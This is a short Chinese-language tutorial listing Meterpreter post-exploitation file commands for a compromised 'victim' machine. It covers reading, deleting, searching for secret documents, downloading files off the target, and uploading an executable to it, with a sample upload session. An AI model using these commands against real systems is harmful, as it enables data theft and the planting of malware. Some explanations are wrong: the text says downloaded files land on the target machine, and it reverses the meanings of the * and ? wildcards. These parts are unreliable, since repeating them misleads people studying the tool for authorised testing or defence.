# Meterpreter-文件处理命令

在获取一定权限后可以对靶机电脑的文件进行一些操作，以扩大战果。

`meterpreter`的文件操作命令和Linux基本相同，不熟悉windows命令的也可以使用。

**文件系统命令**

1. cat -读取并输出到标准输出文件的内容

2. cd -更改目录

3. del -删除文件

4. download-从受害者系统文件下载

   ` -a   Enable adaptive download buffer size
       -b   Set the initial block size for the download
       -c   Resume getting a partially-downloaded file
       -h   Help banner
       -l   Set the limit of retries (0 unlimits)//重复下载次数
       -r   Download recursively//下载文件夹
       -t   Timestamp downloaded files`

   下载的文件会保存在靶机的当前目录下。当然也可以指定路径。

5. edit-用 vim编辑文件

6. `getlwd `-打印本地目录

7. `getwd` -打印工作目录

8. lcd -更改本地目录

9. `lpwd` -打印本地目录

10. ls -列出在当前目录中的文件列表

11. `mkdir` -在目标系统上的创建目录

12. `pwd `-输出工作目录

13. rm -删除文件

14. `rmdir `-受害者系统上删除目录

15. search-文件查找 

    `  -a   Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
        -b   Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
        -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )//搜索路径
        -f   A file pattern glob to search for. (e.g. *secret*.doc?)*单个字符，？多个字符。
        -h   Help Banner
        -r   Recursively search sub directories. (Default: true)//`  

       ``search -f *.xx格式`查找所有xx格式的文件

16.  `show_mount`列举目标机器的挂载点，也就是有几个盘。

17. upload-从攻击者的系统往受害者系统上传文件

    `upload 本地目录文件 目标路径 ////-r上传文件夹`

    `meterpreter > upload /test01/ppp.exe /test
    [*] uploading  : /test01/ppp.exe -> /test
    [*] uploaded   : /test01/ppp.exe -> /test\ppp.exe`

    

    __PS__:`check xx文件`可以校验一些MD5加密的文件。部分命令两个`ll`是对本机文件进行操作如`lcd,lls等`。